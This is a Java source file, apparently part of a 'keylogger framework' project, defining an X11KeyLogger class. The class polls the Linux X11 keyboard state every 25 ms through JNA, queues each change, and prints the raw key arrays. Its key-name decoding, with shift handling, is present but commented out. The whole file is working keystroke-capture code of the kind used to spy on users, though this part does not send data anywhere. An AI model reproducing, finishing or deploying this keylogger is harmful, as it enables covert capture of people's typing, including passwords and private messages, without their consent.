package uk.co.baconi.keylogger.framework.impl.x11;

import com.sun.jna.platform.unix.X11;
import com.sun.jna.platform.unix.X11.Display;
import com.sun.jna.ptr.IntByReference;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import uk.co.baconi.keylogger.framework.constants.Numbers;
import uk.co.baconi.keylogger.framework.impl.AbstractImpl;
import uk.co.baconi.keylogger.framework.interfaces.KeyLogger;

import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.BlockingQueue;

public final class X11KeyLogger extends AbstractImpl<X11KeyResult> implements KeyLogger {

    private static final int _1 = 1;
    private static final int _2 = _1 << _1;
    private static final int _4 = _2 << _1;
    private static final int _8 = _4 << _1;
    private static final int _16 = _8 << _1;
    private static final int _32 = _16 << _1;
    private static final int _64 = _32 << _1;
    private static final int _128 = _64 << _1;

    private static final Logger LOG = LogManager.getLogger();

    private final X11 x11 = X11.INSTANCE;
    private final Display x11Display = x11.XOpenDisplay(null);
    private final int sleepTime = 25;

    private final Map<Integer, X11Key> keyMap = new HashMap<>();

    private X11KeyLogger() {
        super();

        final IntByReference min_key_code = new IntByReference();
        final IntByReference max_key_code = new IntByReference();

        x11.XDisplayKeycodes(x11Display, min_key_code, max_key_code);

        for (int keyCode = min_key_code.getValue(); keyCode <= max_key_code.getValue(); ++keyCode) {
            if (keyCode < min_key_code.getValue()) {
                continue;
            }

            final String keyNameLower = X11Util.getKeyName(x11, x11Display, keyCode, 0);
            final String keyNameUpper = X11Util.getKeyName(x11, x11Display, keyCode, 1);

            keyMap.put(keyCode, new X11Key(keyCode, keyNameLower, keyNameUpper));
        }
    }

    @Override
    public void startLogging() {
        final byte szKey[] = new byte[32];
        final byte szKeyOld[] = new byte[32];

        for (; ; ) {
            try {
                x11.XQueryKeymap(x11Display, szKey);
                if (X11Util.isNotEmpty(szKey) && !Arrays.equals(szKey, szKeyOld)) {
                    addToProcessQueue(new X11KeyResult(Arrays.copyOf(szKey, szKey.length)));
                    System.arraycopy(szKey, Numbers.ZERO, szKeyOld, Numbers.ZERO, szKey.length);
                } else {
                    Thread.sleep(sleepTime);
                }
            } catch (final Throwable t) {
                LOG.error(t.getClass().getName(), t);
            }
        }
    }

    @Override
    protected void processResults(final BlockingQueue<X11KeyResult> processQueue) {
        for (; ; ) {
            try {
                final short[] keys = processQueue.take().getKeyMap();

                System.out.println("Process Thread: " + Arrays.toString(keys));

                // read modifiers (caps lock is ignored)
                // boolean shift = false;
                // boolean ctrl = false;
                // boolean alt = false;
                // boolean meta = false;
                //
                // final List<X11Key> keysPressed = new ArrayList<X11Key>();
                //
                // for (int i = 0; i < keys.length; ++i) {
                // for (int j = 0, test = 1; j < 8; ++j, test *= 2) {
                // if ((keys[i] & test) == 0) {
                // final int keyCode = i * 8 + j;
                //
                // final X11Key x11Key = keyMap.get(keyCode);
                //
                // if (x11Key == null) {
                // continue;
                // }
                //
                // // System.out.println(keyCode);
                //
                // keysPressed.add(x11Key);
                //
                // shift = shift || x11Key.isShift();
                // ctrl = ctrl || x11Key.isCtrl();
                // alt = alt || x11Key.isAlt();
                // meta = meta || x11Key.isMeta();
                // }
                // }
                // }
                //
                // final StringBuilder keysPressedOutput = new StringBuilder();
                // for (final X11Key keyPressed : keysPressed) {
                // keysPressedOutput.append("[");
                // keysPressedOutput.append(keyPressed.getKeyCode());
                // keysPressedOutput.append("-");
                // if (keyPressed.isModifierKey()) {
                // keysPressedOutput.append(keyPressed.getKeyNameLowerCase());
                // } else if (shift) {
                // keysPressedOutput.append(keyPressed.getKeyNameUpperCase());
                // } else {
                // keysPressedOutput.append(keyPressed.getKeyNameLowerCase());
                // }
                // keysPressedOutput.append("], ");
                // }
                // keysPressedOutput.deleteCharAt(keysPressedOutput.lastIndexOf(","));

                // System.out.println(keysPressedOutput.toString());
            } catch (final Throwable t) {
                LOG.error(t.getClass().getName(), t);
            }
        }
    }
}
